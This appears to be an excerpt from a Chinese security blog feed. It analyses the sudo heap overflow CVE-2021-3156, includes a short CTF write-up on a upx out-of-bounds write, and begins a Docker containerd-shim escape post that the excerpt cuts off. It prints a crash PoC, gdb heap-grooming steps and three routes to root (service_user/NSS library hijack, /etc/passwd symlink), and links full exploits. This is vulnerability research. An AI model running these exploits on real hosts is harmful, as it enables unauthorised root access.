8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p><p>Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以 sudo 1.8.31 版本作为分析目标。 ubuntu 20.04.1 作为分析环境</p><p>PoC:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> obufsz = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> obuf[obufsz];</span><br><span class="line"><span class="built_in">memset</span>(obuf, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span>(obuf));</span><br><span class="line">obuf[obufsz<span class="number">-2</span>] = <span class="number">0x5c</span>;</span><br><span class="line">obuf[obufsz<span class="number">-1</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="keyword">char</span> *args[] = &#123;</span><br><span class="line"><span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line"><span class="string">&quot;-s&quot;</span>,</span><br><span class="line">obuf,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *extra_args[] = &#123;</span><br><span class="line"><span class="string">&quot;X/X\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="string">&quot;LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">execve(args[<span class="number">0</span>], args, extra_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execvpe(&quot;./sudoedit&quot;, args, extra_args);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞产生的代码位于 <code>plugins/sudoers/sudoers.c</code>  的 <code>set_cmnd</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" title="image-20210201141621764" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" alt="image-20210201141621764"></a></p><p>首先通过 854 处，为 <code>sudoedit</code>  <code>-s</code>  后的字符长度分配内存空间， 即 <code>user_args</code>,  当代码处理到 866 处的时候， 如果参数为如下结构，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p NewArgv[0]</span><br><span class="line">$4 &#x3D; 0x55555557183e &quot;sudoedit&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[1]</span><br><span class="line">$5 &#x3D; 0x7fffffffee13 &quot;BBBBBB\\&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[2]</span><br><span class="line">$6 &#x3D; 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>第一次拷贝 会将 <code>B</code> 拷贝到 <code>user_args</code> 里，然后 from ++ </p><p>当 <code>B</code> 拷贝完， <code>from[0] == &#39;\\&#39;</code> ， 且<code>from[1]</code> 不为空的时候， 此时 from ++ , 然后又进到这个 while 循环， from 后面的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p from[0]</span><br><span class="line">$3 &#x3D; 92 &#39;\\&#39;</span><br><span class="line">pwndbg&gt; p from[1]</span><br><span class="line">$4 &#x3D; 0 &#39;\000&#39;</span><br></pre></td></tr></table></figure><p>这个时候 from 后面的数据为环境变量设置的数据, 即这里此时 <code>from[0]</code> 为 <code>X/X</code> 。最终结果就是 <code>user_args</code> 被越界</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="三种利用思路"><a href="#三种利用思路" class="headerlink" title="三种利用思路"></a>三种利用思路</h4><p>原作者的提到了， 他们通过随机添加 <code>LC_*</code> 等环境变量来风水堆布局， 产生了数十种 crash 样本，其中有三种利用思路，</p><p>（1）通过覆写 <code>sudo_hook_entry</code>  结构体</p><pre><code>该部分代码位于 `src/hooks.c`  107行 ， 总体思路为 通过堆溢出，劫持函数指针getenv_fn 的低两位， 通过爆破的方法将函数劫持到 `execv` 来执行我们的程序。 该思路已经有公开的利用代码,  可见[Github](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)</code></pre><p>   (2)  通过覆写 <code>service_user</code> 结构体</p><pre><code>该部分代码位于 glibc 源代码中的 `glibc-2.31/nss/nsswitch.c` 的330 行， </code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span> </span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span> </span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span> </span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br></pre></td></tr></table></figure><p>我们通过覆盖 <code>ni-&gt;name</code> ，让程序去 <code>___libc_dlopen</code> 加载我们编写的 libc 库， 在加上 <code>__attribute__ ((constructor))</code> 的魔术方法，来让加载 libc 后第一时间执行我们的代码，</p><p>（3）通过覆写 <code>def_timestampdir </code>结构体</p><pre><code>将def_timestampdir覆盖为一个不存在的目录。然后我们可以与sudo的`ts_mkdirs()`竞争，创建一个指向任意文件的符号链接。并且尝试打开这个文件，向其中写入一个struct timestamp_entry。我们可以符号链接将其指向/etc/passwd，然后以root打开他，然后实现任意用户的注入从而root这个类似的利用似乎也有 [Github](https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c)</code></pre><h4 id="编写利用"><a href="#编写利用" class="headerlink" title="编写利用"></a>编写利用</h4><p>这里简单描述一下，我之前调试编写利用第二种方法的过程</p><p>首先我们知道了 <code>sudo</code> 代码会根据环境变量中的 <code>LC*</code> 来分配释放堆布局</p><blockquote><p>  in setlocale(), we malloc()ate and free() several LC  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at   the very beginning of Sudo’s heap (free fast or tcache chunks);</p></blockquote><p>其次，我们需要明确我们的目标是，我们要让分配的 <code>user_args</code>  结构体 与 <code>service_user</code> 结构体两者间的距离越近越好，因此，我们通过（fuzz 和 手动调试的方法来风水堆布局。</p><p>那么如何判断两者间的距离呢？ 首先我们对分配 <code>user_args</code> 代码处下断， 即 <code>b sudoers.c:854</code> , 然后对使用 <code>service_user</code> 处下断，，即<code>b nsswitch.c:330</code> </p><p>由于我们的利用是通过 <code>execve</code> 来执行 <code>sudoedit</code> ， 因此我们调试的是我们编写利用程序的子进程，因此还需要设置下 gdb 的调试模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br></pre></td></tr></table></figure><p>这样就行了， 我将以上东西集成到一个 gdb 调试脚本中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b policy_check</span><br><span class="line">c</span><br><span class="line">b sudoers.c:854</span><br><span class="line">b nsswitch.c:330  </span><br></pre></td></tr></table></figure><p>然后挂上调试器  <code>gdb exploit -x gdbscript</code> , 查看两者偏移,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/Desktop/CVE<span class="number">-2021</span><span class="number">-3156</span>/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   <span class="number">849</span>     <span class="keyword">size_t</span> size, n;</span><br><span class="line">   <span class="number">850</span></span><br><span class="line">   <span class="number">851</span>     <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">   <span class="number">852</span>     <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">   <span class="number">853</span> size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> ► <span class="number">854</span>     <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="number">855</span> sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">   <span class="number">856</span> debug_return_int(<span class="number">-1</span>);</span><br><span class="line">   <span class="number">857</span>     &#125;</span><br><span class="line">   <span class="number">858</span>     <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">   <span class="number">859</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK </span></span><br><span class="line"><span class="comment">pwndbg&gt; bins</span></span><br><span class="line"><span class="comment">tcachebins</span></span><br><span class="line"><span class="comment">0x20 [  3]: 0x55555557ebc0 —▸ 0x5555555975c0 —▸ 0x55555558f0a0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x40 [  1]: 0x555555586700 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x70 [  1]: 0x55555558f620 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x80 [  1]: 0x555555586680 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x90 [  1]: 0x555555586b60 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x110 [  1]: 0x555555597480 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x190 [  1]: 0x555555584820 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1a0 [  1]: 0x5555555896d0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1e0 [  1]: 0x55555558f440 ◂— 0x0</span></span><br></pre></td></tr></table></figure><p>这里的 <code>tcachebins</code> 是我们即将分配的 <code>user_args</code> chunk，具体分配是哪个， 取决于 <code>user_args</code> 的大小， 然后再 c 一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/glibc<span class="number">-2.31</span>/nss/nsswitch.c</span><br><span class="line">   <span class="number">325</span> <span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">   <span class="number">326</span> <span class="comment">/* Load library.  */</span></span><br><span class="line">   <span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line">   <span class="number">329</span> &#123;</span><br><span class="line"> ► <span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">331</span>     &#123;</span><br><span class="line">   <span class="number">332</span>       <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">   333  library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">   334  is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">   335  holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment">pwndbg&gt; p ni</span></span><br><span class="line"><span class="comment">$1 = (service_user *) 0x555555582c20</span></span><br><span class="line"><span class="comment">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>获取 <code>ni</code> 的地址， 与上面的 <code>tcachebins</code> 进行比较， 越近越好， 我最初的利用脚本两者偏移最小为 0x700 左右，然后中间一路覆盖过去</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" title="image-20210201152543462" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" alt="image-20210201152543462"></a></p><p>将 <code>ni-&gt;name</code> 覆盖为 “X/X” ,其余内容以 <code>\0</code> 覆盖，这里会涉及一个问题，那么就是如何传入<code>\00</code> 字符呢？ 我们知道 参数和环境变量都是不允许写入 <code>\x00</code>的，否则将被截断。通过阅读代码和调试我们最终发现 我们可以单独的 <code>\\</code> 字符来作为一个 <code>\x00</code> 字符。</p><p>最后提及一下，非源码调试的方法，因为当我编写利用后，在本地执行是成功了，但是换了一个机器，即非编译的 sudo 的程序执行的时候却，失败了，这个时候发现自己编译的和系统自带还是不一样的，于是我又写了一个不是自己编译的利用。</p><p>当非源码调试的时候，由于漏洞函数是位于 <code>sudoers.so</code>中，该 so 库并不是一开始就加载的，我们没法在没有符号 和 没有加载的情况下直接下断，所以我们在我们的 <code>payload</code> 设置一些特殊的字符， 比如 <code>0xdeadbeaf</code> 比如我这里设置一个单独的设置 args 参数为 ”BBBBBB”</p><p>以及我们再选择对 libc 中的 <code>__libc_dlopen_mode</code> 函数下断，因为我们最终的目的是 dlopen 我们的目标 so 程序，以及下到这个，也相当于到了 nss_load 函数附近了。</p><p>但是对这个<code> __libc_dlopen_mode</code> 可能需要 glibc 的调试符号，可以通过 <code>apt install libc6-dbg</code>  来安装，以及下断需要开启 <code>Pending Breakpoints</code> 功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat gdbscript</span><br><span class="line">catch exec</span><br><span class="line">set breakpoint pending on</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b __libc_dlopen_mode</span><br></pre></td></tr></table></figure><p>执行 <code>gdb ./exploit -x gdbscript</code></p><p>c 一次， 断到 <code>__libc_dlopen_mode</code> 这是第一次 sudo 在执行 <code>set_cmnd</code> 之前 <code>getpwuid</code> 的 nss_load 操作</p><p>再 c 一次 ， 这个就是 <code>set_cmnd</code> 之后就的 nss_load , 此时就是溢出之后的， 我们可以通过 <code>search BBBB</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search &quot;BBBB&quot;</span><br><span class="line">[heap]          0x555555588bc0 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc4 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc8 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来看我们分配的堆的位置</p><p>以及查看此时的寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x7fffffffb2ea ◂— 0x336a00322e6f732e &#x2F;* &#39;.so.2&#39; *&#x2F;</span><br><span class="line">*RBX  0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line"> RCX  0x322e</span><br><span class="line">*RDX  0x582f58</span><br><span class="line">*RDI  0x7fffffffb2e0 ◂— &#39;libnss_X&#x2F;X.so.2&#39;</span><br><span class="line"> RSI  0x80000002</span><br><span class="line">*R8   0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R9   0x7fffffffb1f0 ◂— 0x0</span><br><span class="line">*R10  0x10</span><br><span class="line"> R11  0x7ffff7f37be0 (main_arena+96) —▸ 0x5555555a06e0 ◂— 0x0</span><br><span class="line">*R12  0x5555555891b0 ◂— 0x0</span><br><span class="line">*R13  0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R14  0x7fffffffb2f0 —▸ 0x7ffff7f0336a ◂— 0x6225206125000200</span><br><span class="line">*R15  0x16</span><br><span class="line">*RBP  0x7fffffffb340 —▸ 0x7fffffffb3a0 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffb2d8 —▸ 0x7ffff7e9262c (nss_load_library+364) ◂— mov    r10, qword ptr [rbp - 0x48]</span><br><span class="line"> RIP  0x7ffff7eae930 (__libc_dlopen_mode) ◂— endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x5555555891e0 地址为要被覆盖的目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x 0x5555555891e0 - 0x555555588bc0</span><br><span class="line">$1 &#x3D; 0x620</span><br></pre></td></tr></table></figure><p>通过这样的方法来查看两者的偏移</p><p>最后的利用见 <a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" title="image-20210201155514383" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" alt="image-20210201155514383"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events">https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-3156" scheme="https://bestwing.me/tags/CVE-2021-3156/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-3rd JunkAV writeup</title>
    <link href="https://bestwing.me/RWCTF-3rd-writeup.html"/>
    <id>https://bestwing.me/RWCTF-3rd-writeup.html</id>
    <published>2021-01-10T16:00:00.000Z</published>
    <updated>2021-01-11T09:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>I made a challenge name <a href="https://github.com/chaitin/Real-World-CTF-3rd-Challenge-Attachments/tree/main/JunkAV">JunkAV</a> for RWCTF 3rd .  This is an oob write vulnerability caused by a upx processing PE program.  Congratulations to CodeR00t and 217 who solved it during the game.</p><blockquote><p>Thank <a href="https://twitter.com/leommxj">@leommxj</a> for contributing to this challenge</p></blockquote><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>Vulnerability is in the PeFile::rebuildRelocs function of pefile.cpp in upx 3.96 .</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png"></a></p><p>When calling the unoptimizeReloc function</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png"></a></p><ol><li>The size of the relocn can be controlled by the user, so the allocation size can be controlled.</li><li>The 1024-1033 guild will flip the data.</li><li>When the data is flipped later, the <code>jc</code> variable on line 1021 becomes controllable, and finally the oob write is completed on line 1023</li></ol><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><p>generated upx compressed program :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py</a></p></li><li><p>ibuf_mod :</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod">http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod</a></p></li><li><p>IO script:</p><p>​        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py</a></p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/">https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-15257 Docker 逃逸漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-15257-anaylysis.html"/>
    <id>https://bestwing.me/CVE-2020-15257-anaylysis.html</id>
    <published>2020-12-04T16:00:00.000Z</published>
    <updated>2021-06-27T06:59:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CVE-2020-15257（Docker-容器逃逸）"><a href="#CVE-2020-15257（Docker-容器逃逸）" class="headerlink" title="CVE-2020-15257（Docker 容器逃逸）"></a>CVE-2020-15257（Docker 容器逃逸）</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2020/11/30，公开了 <a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"><strong>CVE-2020-15257</strong></a> 的细节。该漏洞影响 containerd 1.3.x, 1.2.x, 1.4.x 版本</p><p>由于在 host 模式下，容器与 <strong>host</strong> 共享一套 <strong>Network namespaces</strong> ，此时 <strong>containerd-shim API</strong> 暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器为 root 权限，且容器的网络模式为 <code>--net=host</code> 的时候，通过 <strong>ontainerd-shim API</strong>  可以达成容器逃逸的目的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png"></a></p><h3 id="containerd-shim"><a href="#containerd-shim" 